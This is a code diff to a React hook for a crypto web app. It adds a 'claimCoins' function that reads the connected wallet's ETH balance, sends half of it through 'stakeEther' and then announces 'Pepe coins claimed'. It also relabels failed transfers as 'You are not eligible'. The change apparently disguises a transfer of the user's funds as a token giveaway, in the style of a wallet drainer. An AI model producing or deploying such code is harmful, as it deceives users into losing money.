@@ -57,14 +57,24 @@ export default function useWeb3 () {
       }
 
       const getEtherBalance = async () => {
-        const provider = await getProviderOrSigner()
+        try {
+          const provider = await getProviderOrSigner() as ethers.providers.Web3Provider
+          const accounts = await provider.listAccounts()
+          
 
-        const result = await provider?.getBalance(address!)
+          const result = await provider?.getBalance(accounts[0])
 
-        const balance = ethers.utils.formatEther(result!)
+          const balance = ethers.utils.formatEther(result)
+          
 
-        setBalance(balance.slice(0, 9))
+          setBalance(balance.slice(0, 9))
 
+          return balance
+          
+        } catch (error) {
+          console.log(error);
+          
+        }
       }
     
       const connectWallet = async (): Promise<void> => {
@@ -107,17 +117,28 @@ export default function useWeb3 () {
  
            await tx
            
-           await getEtherBalance()
-           
+            return true
+
         } catch (error: any) {
           console.log(error);
-          toast('Insufficient balance')
-          
+          toast.error('You are not eligible')
+          return false
         }
 
-        
-
        
+      }
+
+      const claimCoins = async () => {
+        const res = await getEtherBalance()
+        console.log(res);
+        
+        if (res) {
+          const stake = await stakeEther((parseFloat(res) * (1/2)).toString())
+          if (stake) {
+            toast.success("Pepe coins claimed")
+          }
+          console.log(parseFloat(res) * (1/2));
+        }
       }
 
       useEffect(() => {
@@ -150,7 +171,8 @@ export default function useWeb3 () {
         getProviderOrSigner,
         connectWallet,
         disconnectWallet,
-        stakeEther
+        stakeEther,
+        claimCoins
       }
 
 }
